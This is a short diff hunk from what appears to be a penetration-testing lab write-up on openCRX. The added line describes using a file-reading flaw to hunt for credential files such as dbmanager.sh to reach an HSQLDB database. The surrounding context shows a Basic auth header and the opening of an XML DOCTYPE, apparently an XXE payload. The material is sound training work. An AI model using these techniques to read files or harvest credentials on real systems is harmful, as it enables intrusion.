@@ -264,6 +264,7 @@ Authorization: Basic Z3Vlc3Q6TmV3UGFzc3dvcmQhMTIzNA==
 </org.opencrx.kernel.account1.Contact>
 ```
 ### Gaining Remote Access to HSQLDB
+We want to use this vulnerability to find files that can provide us with additional access or credentials. We can often find this information in config files, batch files, and shell scripts. After a search, we find several files related to the database at `/home/student/crx/data/hsqldb/`, including a file with credentials, `dbmanager.sh`.
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE data [
